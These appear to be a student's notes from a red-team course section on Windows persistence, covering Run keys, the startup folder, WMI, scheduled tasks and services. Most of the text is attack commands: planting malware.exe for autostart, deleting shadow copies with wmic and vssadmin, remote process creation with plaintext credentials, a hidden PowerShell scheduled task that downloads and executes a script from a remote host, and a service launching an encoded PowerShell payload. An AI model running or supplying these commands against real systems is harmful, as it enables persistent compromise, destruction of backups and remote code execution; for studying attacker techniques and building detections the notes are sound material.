# [Persistence](https://www.udemy.com/course/red-team-operations-initial-access-to-ransomware-deployment/learn/lecture/39335384?start=0#overview) - section 6

## <a name="reg_keys">Registry keys</a>
Run Keys:
> HKCU\Software\Microsoft\Windows\CurrentVersion\Run
> 
> HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
> 
> HKLM\Software\Microsoft\Windows\CurrentVersion\Run
> 
> HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

Examples:

    reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Notepad /t REG_SZ /d "C:\Windows\System32\notepad.exe"

Startup keys:
> HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
> 
> HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
> 
> HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
> 
> HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

Examples:
    cp malware.exe "C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

Service Keys:
> HKLM\SYSTEM\CurrentControlSet\Services

Examples:

## <a name="startup">Startup folder</a>
Startup folder:
> C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

Examples:

    cp malware.exe "C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

## <a name="wmi">Windows Management Instrumentation (WMI)</a>
Examples:

Reconnaissance

    wmic useraccount list full
    wmic group list full

Impact

    wmic shadowcopy delete /noninteractive
    wmic process call create vssadmin.exe delete shadows /all /quiet 
    wmic process call create malware.exe

Lateral movement

    wmic /node:192.168.4.31 /user:dgolding /password:Password123 process call create "C:\malware.exe"

Review video 23 for filter + consumer = binding

## <a name="sched">Scheduled tasks</a>
Examples:

    schtasks /create /sc onlogon /tn "malware" /tr "C:\malware.exe"
    schtasks /create /sc minute /mo 1 /tn "malware" /tr "C:\malware.exe"
    schtasks /create /tn "malware" /tr "C:\Windows\syswow64\WindowsPowershell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep Bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.4.31/malware.ps1'''))'" /sc onlogon /ru System
    schtasks /query /fo list /v
    schtasks /delete /tn "malware" /f
    schtasks /run /tn "malware"

## <a name="serv">Services</a>

Examples:

    sc query windefend
    sc create malware binpath="C:\malware.exe" start=auto
    sc start malware
    sc start malware
    sc delete malware
    sc create malware binpath="powershell.exe PABzAGMAcgBpAHAAdAAgAGwAYQBuAGcAdQBhAGcAZQA9ACIAVgBCA==" start=auto